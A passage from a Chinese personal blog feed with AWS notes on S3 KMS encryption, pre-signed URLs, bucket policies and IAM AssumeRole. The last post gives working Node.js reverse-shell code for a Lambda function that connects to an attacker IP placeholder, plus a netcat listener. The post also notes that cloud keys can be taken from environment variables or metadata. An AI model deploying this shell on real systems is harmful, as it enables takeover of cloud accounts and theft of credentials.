经过KMS加密之后还能直接公开访问object吗？"></a>0x02 经过KMS加密之后还能直接公开访问object吗？</h2><p>众所周知，当我们给一个S3 Bucket设置KMS加密之后，当我们把对象公开之后，是没有办法直接通过URL去访问的。其背后的原理是因为当我们下载对象的时候需要向KMS服务端发起解密的请求，而直接通过浏览器URL访问，是没有带任何KMS相关的参数的，所以也就没有解密这种说法了。<br>我这边尽可能的多想一些场景测试看看，基本覆盖日常常见问题：</p><ol><li>不加密的S3 Bucket，当我们公开一个对象之后，是可以直接访问的（这个没什么说的，就是预期功能），为了保证实验的顺利进行，先关闭S3 Bucket的【阻止所有公共访问】功能，然后公开一个对象看看：</li></ol><p><img src="B25EEDB9C1A14E0AB9F65EA0893B44C7" alt="image"></p><p>可以看到浏览器中已经可以正常打开这个公开的对象了：</p><p><img src="1E42AFC4A623479191A38493F677A632" alt="image"></p><ol start="2"><li>那如果我上传的对象使用KMS加密了呢？其再次公开的时候会出现什么现象？</li></ol><p><img src="B960B0E0A2F0479D942601FDD6C4C929" alt="image"></p><p>可以看到，当我们在浏览器中直接访问是，其会报一个无效参数的错误。</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# curl https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/HappyFace.jpg</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Error&gt;&lt;Code&gt;InvalidArgument&lt;/Code&gt;&lt;Message&gt;Requests specifying Server Side Encryption with AWS KMS managed keys require AWS Signature Version 4.&lt;/Message&gt;&lt;ArgumentName&gt;Authorization&lt;/ArgumentName&gt;&lt;ArgumentValue&gt;null&lt;/ArgumentValue&gt;&lt;RequestId&gt;1EE0A543A5ACF250&lt;/RequestId&gt;&lt;HostId&gt;vx4Jj96IbW6MGeo4+nNkCzJqtsjo7+7tnxoxr1M6SZG+otZMp3oB0Z1Qb9F+Yr9QzQc7BqsuYmY=&lt;/HostId&gt;&lt;/Error&gt;[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></code></pre><p>看到这个报错是提示我没有使用signV4的签名，那我使用CLI去跨账号测试，看看会提示什么：</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg</span><br><span class="line">download failed: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg An error occurred (AccessDenied) when calling the GetObject operation: Access Denied</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></code></pre><p>没有报参数无效，而是报了一个访问拒绝的：</p><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg</span><br><span class="line">download failed: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg An error occurred (AccessDenied) when calling the GetObject operation: Access Denied</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></code></pre><p>这就比较有意思了，对象明明已经公开了，但是仍然提示访问拒绝，那估计我把KMS CMK的加解密权限也公开之后没准通过CLI随便指定个User之后，没准就能访问了呢。</p><ol start="3"><li>说干就干哈，KMS CMK加解密权限公开，S3 对象权限公开之后，会是啥状态呢？<br>当然，不用想了，浏览器中访问，签名走的是signV2所以肯定跟上面报一个错误的：</li></ol><p><img src="87F88A931DE341D0A10E7812D3AF3A0A" alt="image"></p><p>比较有意思的是，我在CLI中使用另一个用户下载该对象是成功的（KMS CMK的加解密权限已公开）：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg</span><br><span class="line">download: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>按照这个思路，如果作为一个匿名用户，也通过signV4签名的方式访问，是不是也可以下载这个经过KMS加密的公开的对象了呢，比较尴尬的，似乎signV4就是要使用AKSK的，所以没法整，匿名用户都是走的signV2。<br>如果我使用–no-sign-request参数呢，可以看到也是不行的，因为你没有办法让–no-sign-request访问KMS的时候走signV4：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 cp s3://aaabbbccc/HappyFace.jpg HappyFace.jpg --no-sign-request</span><br><span class="line">download failed: s3://aaabbbccc/HappyFace.jpg to ./HappyFace.jpg An error occurred (InvalidArgument) when calling the GetObject operation: Requests specifying Server Side Encryption with AWS KMS managed keys require AWS Signature Version 4. You can enable AWS Signature Version 4 by running the command:</span><br><span class="line">aws configure set s3.signature_version s3v4</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>至此，我再总结一下：</p><ol><li>如果使用了KMS加密，那无论KMS CMK的权限，当我把S3 object公开之后，通过浏览器或者wget都是不能访问的，会提示“无效参数”的错误。</li><li>如果使用了KMS加密，KMS的权限对外开放，那我如果使用CLI配置某一个用户之后是可以正常访问的</li><li>如果使用了KMS加密，KMS的权限对外开放，如果CLI使用–no-sign-request匿名执行命令也是不可以的</li></ol><h2 id="0x03-经过KMS加密之后还能通过pre-signed-URL的方式将object公开访问吗？"><a href="#0x03-经过KMS加密之后还能通过pre-signed-URL的方式将object公开访问吗？" class="headerlink" title="0x03 经过KMS加密之后还能通过pre-signed URL的方式将object公开访问吗？"></a>0x03 经过KMS加密之后还能通过pre-signed URL的方式将object公开访问吗？</h2><p>容我先把KMS CMK的权限改回去，然后关闭该对象的公开访问，然后在生成pre-signed URL试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 presign s3://aaabbbccc/HappyFace.jpg --profile root</span><br><span class="line">https://aaabbbccc.s3.cn-north-1.amazonaws.com.cn/HappyFace.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAXUIR4JOPO4YK27P7%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T142742Z&amp;X-Amz-Signature=1bc979333e36b60d908f59811d9221303b1a44957821c5d35996300ede935cc6</span><br><span class="line">[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>可以看到，是正常访问的：</p><p><img src="EB07150A82F443D4AE078C979CD09A0E" alt="image"></p><p>这件事其实还是比较好理解的，因为生成临时的签名，我也是用当前用户凭证去签的，当前用户有权限就行，所以生产的pre-signed URL是可以正常访问的（用KMS加密的对象也没事）。</p><h2 id="0x04-访问S3-pre-signed-URL报认证错误应该怎么处理？"><a href="#0x04-访问S3-pre-signed-URL报认证错误应该怎么处理？" class="headerlink" title="0x04 访问S3 pre-signed URL报认证错误应该怎么处理？"></a>0x04 访问S3 pre-signed URL报认证错误应该怎么处理？</h2><p>访问S3 pre-signed URL，报如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 ~]# aws s3 presign s3://aaabbb/webwxgeticon.jpg</span><br><span class="line">https://aaabbb.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAUKT6WCRV7BGA6LF3%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T143127Z&amp;X-Amz-Signature=38ec063e7940823b351e9a9798f82087929bcff1f2dab7a1ad49a705fb74a8b4</span><br><span class="line">[root@ip-10-0-0-64 ~]# curl &quot;https://aaabbb.s3.cn-north-1.amazonaws.com.cn/webwxgeticon.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=AKIAUKT6WCRV7BGA6LF3%2F20191123%2Fcn-north-1%2Fs3%2Faws4_request&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Date=20191123T143127Z&amp;X-Amz-Signature=38ec063e7940823b351e9a9798f82087929bcff1f2dab7a1ad49a705fb74a8b4&quot;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;Error&gt;&lt;Code&gt;UnauthorizedAccess&lt;/Code&gt;&lt;Message&gt;You are not authorized to perform this operation&lt;/Message&gt;&lt;RequestId&gt;6116F30427B5AB43&lt;/RequestId&gt;&lt;HostId&gt;3wtTSiON9hssqGNCYfz+mCqigoFxl0s+DTJt3DKUEG9ABhGH5gOxCfOu7yJdKUHapN81r5uBUs0=&lt;/HostId&gt;&lt;/Error&gt;[root@ip-10-0-0-64 ~]#</span><br></pre></td></tr></table></figure></p><p>报这个错误的话，通常是由于当前账号未备案导致的（中国特色干啥都得备案），去找AWS备案就完事了。<br>当你公开对象的时候访问报这个错误，也是这个原因，挺那啥的这事。。。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>整理了一下S3 pre-signed URL与KMS加密的一些玩法，太不黑客了，不咋快乐。</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p>[1] presign, <a href="https://docs.aws.amazon.com/cli/latest/reference/s3/presign.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/cli/latest/reference/s3/presign.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;在这篇文章中，我会记录一下关于S3 pre-signed url和KMS加密交互的一些玩法。比如说：
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>S3 Bucket 如何配置才能做到只允许某一个IAM User操作？</title>
    <link href="https://tonghuaroot.com/2019/11/21/S3-Bucket-Policy-Only-One-User/"/>
    <id>https://tonghuaroot.com/2019/11/21/S3-Bucket-Policy-Only-One-User/</id>
    <published>2019-11-21T05:52:27.000Z</published>
    <updated>2019-11-21T13:52:58.358Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有这么个需求，我有一个S3 Bucket，然后我只想让某一个User管理，我应该咋操作。<br>简而言之，可以通过Bucket Policy实现，限制某一个IAM User才能访问，然后其他的操作全都deny掉。</p><h2 id="0x01-Policy"><a href="#0x01-Policy" class="headerlink" title="0x01 Policy"></a>0x01 Policy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Effect&quot;: &quot;Deny&quot;,</span><br><span class="line">            &quot;Principal&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;s3:*&quot;,</span><br><span class="line">            &quot;Resource&quot;: [</span><br><span class="line">                &quot;arn:aws-cn:s3:::bucketname/*&quot;,</span><br><span class="line">                &quot;arn:aws-cn:s3:::bucketname&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;StringNotEquals&quot;: &#123;</span><br><span class="line">                    &quot;aws:username&quot;: &quot;username&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你要是用这个Policy的话，需要修改bucketname、username，别的没啥了。<br>Policy比较简单，大意就是有一个条件aws:username不等于我的username的，我就全都给deny掉。</p><p>这个是允许的user执行结果<br><img src="4D41A2B31F384E2DA5E5E5B8267E14AE" alt="image"></p><p>这个是其他无权限的user<br><img src="7BFCAA733F854E1A930ABC2E83283F1A" alt="image"></p><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>可以在根据指定的action做一些精细化的访问控制，不过那就不在这个的讨论范围了。</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p>没参考啥，去Policy的控制台测测就完了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;有这么个需求，我有一个S3 Bucket，然后我只想让某一个User管理，我应该咋操作。&lt;br&gt;简而
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>聊一聊AssumeRole和Trust Relationship</title>
    <link href="https://tonghuaroot.com/2019/11/21/IAM-AssumeRole-and-TrustRelationship/"/>
    <id>https://tonghuaroot.com/2019/11/21/IAM-AssumeRole-and-TrustRelationship/</id>
    <published>2019-11-21T01:26:38.000Z</published>
    <updated>2019-11-21T13:00:26.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>AWS在IAM服务提供了一个Role的功能，Role的话就是可以扩大自己的权限，比如说一个user可以临时assume一个role，那这个user就具备这个role的权限了。或者跨账号访问的时候也可以用这个role。再比如说我做SSO的时候，也是用role实现的。</p><p>那和role相关的最小action都有哪些呢？这一节我们就来聊一聊这块。</p><h2 id="0x01-IAM-Role-权限的组成部分"><a href="#0x01-IAM-Role-权限的组成部分" class="headerlink" title="0x01 IAM Role 权限的组成部分"></a>0x01 IAM Role 权限的组成部分</h2><p>我这里创建两个role（一个role A，一个role B），role A是为了让EC2实例附加，role B是为了让role A assume。</p><p>Role B的Policy具有管理员权限（当然我们这节也不用关系它），重点看看role B的信任关系，和role A的Policy。</p><p>IAM Role 的权限通常由两部分组成，一个是Policy，一个是Trust Relationship（信任关系）。Policy就是我这个role能干多大的事。信任关系就是说，谁能assume这个role，这里的“谁”，可能是指user、role等等。其实我现在jio着这个信任关系，倒是跟S3 Bucket Policy还是有几分相像的。</p><p>那就先看看这个role还有信任关系啥的吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam get-role --role-name assumerole_role_target</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Role&quot;: &#123;</span><br><span class="line">        &quot;Description&quot;: &quot;Allows EC2 instances to call AWS services on your behalf.&quot;,</span><br><span class="line">        &quot;AssumeRolePolicyDocument&quot;: &#123;</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Action&quot;: &quot;sts:AssumeRole&quot;,</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">                    &quot;Principal&quot;: &#123;</span><br><span class="line">                        &quot;AWS&quot;: &quot;arn:aws-cn:iam::123456789012:role/assume_role_ec2&quot;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;MaxSessionDuration&quot;: 3600,</span><br><span class="line">        &quot;RoleId&quot;: &quot;AROAUKT6WCRVQNHNPAHIN&quot;,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2019-11-21T03:46:08Z&quot;,</span><br><span class="line">        &quot;Tags&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">                &quot;Value&quot;: &quot;test&quot;,</span><br><span class="line">                &quot;Key&quot;: &quot;Name&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        &quot;RoleName&quot;: &quot;assumerole_role_target&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws-cn:iam::123456789012:role/assumerole_role_target&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>再来看看role A的Policy：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam list-role-policies --role-name assume_role_ec2</span><br><span class="line">&#123;</span><br><span class="line">    &quot;PolicyNames&quot;: []</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>为空时因为我们没有内联策略，然后我现在给他附加了一个托管策略（admin_test），不过策略的内容是空的。</p><p><img src="C23DC59AE3E44289B02B5388D53A17D6" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam get-policy --policy-arn arn:aws-cn:iam::123456789012:policy/admin_test</span><br><span class="line">&#123;</span><br><span class="line">    &quot;Policy&quot;: &#123;</span><br><span class="line">        &quot;PolicyName&quot;: &quot;admin_test&quot;,</span><br><span class="line">        &quot;PermissionsBoundaryUsageCount&quot;: 0,</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2019-11-21T04:06:32Z&quot;,</span><br><span class="line">        &quot;AttachmentCount&quot;: 1,</span><br><span class="line">        &quot;IsAttachable&quot;: true,</span><br><span class="line">        &quot;PolicyId&quot;: &quot;ANPAUKT6WCRV5UNNV3DZA&quot;,</span><br><span class="line">        &quot;DefaultVersionId&quot;: &quot;v3&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws-cn:iam::123456789012:policy/admin_test&quot;,</span><br><span class="line">        &quot;UpdateDate&quot;: &quot;2019-11-21T04:35:13Z&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure><p>可以看到我现在这个role现在附加的Policy只有个ec2:DescribeInstances权限，对IAM相关的权限肯定没啥影响。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws iam get-policy-version --policy-arn arn:aws-cn:iam::123456789012:policy/admin_test  --version-id v4</span><br><span class="line">&#123;</span><br><span class="line">    &quot;PolicyVersion&quot;: &#123;</span><br><span class="line">        &quot;CreateDate&quot;: &quot;2019-11-21T08:45:11Z&quot;,</span><br><span class="line">        &quot;VersionId&quot;: &quot;v4&quot;,</span><br><span class="line">        &quot;Document&quot;: &#123;</span><br><span class="line">            &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">            &quot;Statement&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Action&quot;: &quot;ec2:DescribeInstances&quot;,</span><br><span class="line">                    &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">                    &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">                    &quot;Sid&quot;: &quot;VisualEditor0&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;IsDefaultVersion&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><h2 id="0x02-测试看看"><a href="#0x02-测试看看" class="headerlink" title="0x02 测试看看"></a>0x02 测试看看</h2><p>然后我现在做一个assume操作试试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws sts assume-role --role-arn arn:aws-cn:iam::123456789012:role/assumerole_role_target --role-session-name xxx</span><br><span class="line">&#123;</span><br><span class="line">    &quot;AssumedRoleUser&quot;: &#123;</span><br><span class="line">        &quot;AssumedRoleId&quot;: &quot;AROAUKT6WCRVQNHNPAHIN:xxx&quot;,</span><br><span class="line">        &quot;Arn&quot;: &quot;arn:aws-cn:sts::123456789012:assumed-role/assumerole_role_target/xxx&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;Credentials&quot;: &#123;</span><br><span class="line">        &quot;SecretAccessKey&quot;: &quot;xx&quot;,</span><br><span class="line">        &quot;SessionToken&quot;: &quot;xx&quot;,</span><br><span class="line">        &quot;Expiration&quot;: &quot;2019-11-21T09:49:55Z&quot;,</span><br><span class="line">        &quot;AccessKeyId&quot;: &quot;xx&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@ip-10-0-0-64 tmp]# date</span><br><span class="line">Thu Nov 21 08:50:35 UTC 2019</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>可以看到已经成了。</p><p>那我再来修改一下role B的信任关系，修改成当前账号的root arn试试。</p><p><img src="C8FA85D9759946C0B7A19E705254ECCB" alt="image"></p><p>然后在执行assume role操作，可以看到这个操作被拒绝了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-0-0-64 tmp]# aws sts assume-role --role-arn arn:aws-cn:iam::123456789012:role/assumerole_role_target --role-session-name xxx</span><br><span class="line"></span><br><span class="line">An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws-cn:sts::123456789012:assumed-role/assume_role_ec2/i-111ecda157b494afe is not authorized to perform: sts:AssumeRole on resource: arn:aws-cn:iam::123456789012:role/assumerole_role_target</span><br><span class="line">[root@ip-10-0-0-64 tmp]#</span><br></pre></td></tr></table></figure></p><p>那这是因为啥呢，起初我刚看到这个现象的时候一脸懵逼啊，心想我root账号都有权限了，凭啥role就没权限搞呢？</p><p>后来想想对标一下S3 Bucket Policy这个事就明了了，我只是把权限给root了，但是作为root账号我还要把权限委派下去啊，我需要给role A一个sts:AssumeRole的权限。</p><p><img src="9615AC89FD9C4A09B115202C8CD12751" alt="image"></p><p>再来试试：</p><p><img src="1F90A49B947A45AEB7CCC47AA19770E3" alt="image"></p><p>可以看到已经成功了哈。</p><h2 id="0x03-跨账号能这么玩吗？"><a href="#0x03-跨账号能这么玩吗？" class="headerlink" title="0x03 跨账号能这么玩吗？"></a>0x03 跨账号能这么玩吗？</h2><p><img src="8A360C98FDAA4B7C9E02F5E4A490BFF1" alt="image"></p><p>嗯，试了一下，跨账号这么晚也没啥毛病。</p><p>当然比较常见的使用方法，除了使用cli，在控制台中也可以这么操作：</p><p><img src="A93793ABD19D4B16AF13AC377B4C7A22" alt="image"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><ul><li>同一账号下，role B的信任关系中有role A的ARN就够了</li><li>跨账号的场景下，role C（另一个账号的role，信任关系中要包含role A的ARN，role A也要有assume role的权限才能玩）</li></ul><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><ul><li><a href="https://docs.aws.amazon.com/cli/latest/reference/iam/list-role-policies.html" target="_blank" rel="noopener">list-role-policies</a></li><li><a href="https://docs.aws.amazon.com/cli/latest/reference/iam/get-role.html" target="_blank" rel="noopener">get-role</a></li><li><a href="https://docs.aws.amazon.com/cli/latest/reference/iam/get-role-policy.html" target="_blank" rel="noopener">get-role-policy</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;AWS在IAM服务提供了一个Role的功能，Role的话就是可以扩大自己的权限，比如说一个user可
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AWS Lambda Node.js 反弹shell</title>
    <link href="https://tonghuaroot.com/2019/11/19/AWS-Lambda-Node-js-reverse-shell/"/>
    <id>https://tonghuaroot.com/2019/11/19/AWS-Lambda-Node-js-reverse-shell/</id>
    <published>2019-11-19T05:29:28.000Z</published>
    <updated>2019-11-19T13:30:08.065Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>原本在测AWS Lambda，后来变成研究Node.js反弹shell了，hhh。</p><h2 id="0x01-被攻击端"><a href="#0x01-被攻击端" class="headerlink" title="0x01 被攻击端"></a>0x01 被攻击端</h2><p>直接套到lambda函数里就行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">    var net = require(&quot;net&quot;),</span><br><span class="line">    cp = require(&quot;child_process&quot;),</span><br><span class="line">    sh = cp.spawn(&quot;/bin/sh&quot;, []);</span><br><span class="line">    var client = new net.Socket();</span><br><span class="line">    client.connect(8080, &quot;此处替换为攻击端IP&quot;, function()&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    return /a/;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p><h2 id="0x02-攻击端"><a href="#0x02-攻击端" class="headerlink" title="0x02 攻击端"></a>0x02 攻击端</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8820</span><br></pre></td></tr></table></figure><p><img src="30A77ADC0C20496B90A0EC64DA37CE0D" alt="image"></p><h2 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h2><p>这就就是云服务接管比直接的服务器被控的危害更大，就是可以在环境变量或者元数据中拿AKSK，然后权限配置不当的话，可以直接控了整个云账号了。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 